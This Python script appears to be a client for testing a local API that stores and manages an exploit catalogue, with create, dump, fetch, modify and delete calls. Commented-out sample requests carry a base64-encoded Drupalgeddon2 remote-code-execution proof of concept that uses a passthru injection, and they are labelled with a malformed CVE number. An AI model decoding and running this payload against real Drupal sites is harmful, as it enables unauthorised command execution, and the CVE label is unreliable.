import requests
import json

headers = {
    "Content-Type": "application/json; charset=utf-8"
}

def ejecutar1(peticion, headers):
    r = requests.post("http://127.0.0.1:3000/exploits-crear",data=json.dumps(peticion), headers=headers)
    print(r.text)

def ejecutar2(peticion, headers):
    r = requests.post("http://127.0.0.1:3000/exploits-volcado",data=json.dumps(peticion), headers=headers)
    print(r.text)

def ejecutar3(peticion, headers):
    r = requests.post("http://127.0.0.1:3000/exploits-individual",data=json.dumps(peticion), headers=headers)
    print(r.text)

def ejecutar4(peticion, headers):
    r = requests.post("http://127.0.0.1:3000/exploits-modificar",data=json.dumps(peticion), headers=headers)
    print(r.text)

def ejecutar5(peticion, headers):
    r = requests.post("http://127.0.0.1:3000/exploits-eliminar",data=json.dumps(peticion), headers=headers)
    print(r.text)

# peticion = {
#     "exploit":"shell_drupalgeddon2.sh",
#     "contenido":"Zm9ybV9idWlsZF9pZD0kKGN1cmwgLWsgLXMgJ0FQUF9TSVRJTy8/cT11c2VyL3Bhc3N3b3JkJm5hbWVcWyUyM3Bvc3RfcmVuZGVyXF1cW1xdPXBhc3N0aHJ1Jm5hbWVcWyUyM3R5cGVcXT1tYXJrdXAmbmFtZVxbJTIzbWFya3VwXF09ZWNobytFeGl0bycgLS1kYXRhICJmb3JtX2lkPXVzZXJfcGFzcyZfdHJpZ2dlcmluZ19lbGVtZW50X25hbWU9bmFtZSIgfCBncmVwIGZvcm1fYnVpbGRfaWQgfCBjdXQgLWQgIlwiIiAtZjYpCmN1cmwgLWsgLWkgIkFQUF9TSVRJTy8/cT1maWxlL2FqYXgvbmFtZS8lMjN2YWx1ZS8ke2Zvcm1fYnVpbGRfaWR9IiAtLWRhdGEgImZvcm1fYnVpbGRfaWQ9JHtmb3JtX2J1aWxkX2lkfSI=",
#     "extension":"sh",
#     "cve":"CVE-2018-002",
#     "software":{
#         "nombre":"Drupal",
#         "version":"7.58"
#     }
# }

# peticion = {
#     "exploit":"shell_drupalgeddon1.sh",
#     "contenido":"Zm9ybV9idWlsZF9pZD0kKGN1cmwgLWsgLXMgJ0FQUF9TSVRJTy8/cT11c2VyL3Bhc3N3b3JkJm5hbWVcWyUyM3Bvc3RfcmVuZGVyXF1cW1xdPXBhc3N0aHJ1Jm5hbWVcWyUyM3R5cGVcXT1tYXJrdXAmbmFtZVxbJTIzbWFya3VwXF09ZWNobytFeGl0bycgLS1kYXRhICJmb3JtX2lkPXVzZXJfcGFzcyZfdHJpZ2dlcmluZ19lbGVtZW50X25hbWU9bmFtZSIgfCBncmVwIGZvcm1fYnVpbGRfaWQgfCBjdXQgLWQgIlwiIiAtZjYpCmN1cmwgLWsgLWkgIkFQUF9TSVRJTy8/cT1maWxlL2FqYXgvbmFtZS8lMjN2YWx1ZS8ke2Zvcm1fYnVpbGRfaWR9IiAtLWRhdGEgImZvcm1fYnVpbGRfaWQ9JHtmb3JtX2J1aWxkX2lkfSI=",
#     "extension":"sh",
#     "cve":"CVE-2018-002",
#     "cms":{
#         "cms_nombre":"Drupal",
#         "cms_categoria":"pluggin",
#         "cms_extension_nombre":"Form 7",
#         "cms_extension_version":"9.8"
#     }
# }
# ejecutar1(peticion, headers)

# peticion = {}
# ejecutar2(peticion, headers)

# peticion = {"exploit":"ruby_drupalgeddon2.rb"}
# ejecutar3(peticion, headers)

peticion = {
    "exploit":"ruby_drupalgeddon2.rb",
    "contenido":"",
    "extension":"ruby",
    "cve":"CVE-2018-002",
    "software":{
        "nombre":"Drupal",
        "version":"7.57"
    }
}
ejecutar4(peticion, headers)

# peticion = {"exploit":"ruby_drupalgeddon2.rb"}
# ejecutar5(peticion, headers)